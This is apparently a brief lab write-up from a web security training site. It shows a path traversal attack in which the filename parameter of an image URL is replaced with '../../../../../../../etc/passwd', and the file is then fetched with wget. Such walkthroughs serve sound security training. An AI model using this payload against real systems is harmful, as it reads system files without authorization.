To exploit Path Traversal we need to find entry point, some kind of parameter or URL where we can add path to file. 
After research in app I've found, that there there are paths to images hosted on blog.

Example of path to the image looks like that:

![image](https://github.com/user-attachments/assets/27e8b853-8851-45c5-b74e-646e640deb91)

![image](https://github.com/user-attachments/assets/c0428013-3cf7-4c1f-b214-a7948811770a)


complete URL of the image: https://0a0a0005037186898028e95800ab00e2.web-security-academy.net/image?filename=48.jpg

I decied to change this to view-source:https://0a0a0005037186898028e95800ab00e2.web-security-academy.net/image?filename=../../../../../../../etc/passwd

The image is broken and because of that it is not rendering correctly on the site. But that is not a problem.

I can download image using wget and then cat informations.

`wget "https://0a0a0005037186898028e95800ab00e2.web-security-academy.net/image?filename=../../../../../../../etc/passwd" -O out.txt `
`cat out.txt`

Final result:
![image](https://github.com/user-attachments/assets/5077e82c-b551-4eac-b6da-cacc277a9e3e)

